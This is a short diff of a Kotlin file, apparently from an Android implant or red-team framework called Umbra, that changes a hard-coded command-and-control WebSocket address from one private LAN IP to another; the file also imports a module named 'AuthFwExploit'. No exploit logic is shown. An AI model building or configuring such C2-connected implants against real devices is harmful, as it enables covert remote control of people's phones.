@@ -28,7 +28,7 @@ import org.umbra.core.modules.AuthFwExploit
 
 object UmbraEngine {
     private const val TAG = "Umbra"
-    private const val DEFAULT_C2 = "wss://192.168.1.9:8443/c2"
+    private const val DEFAULT_C2 = "wss://192.168.1.11:8443/c2"
     private var started = false
 
     fun start(context: Context) {
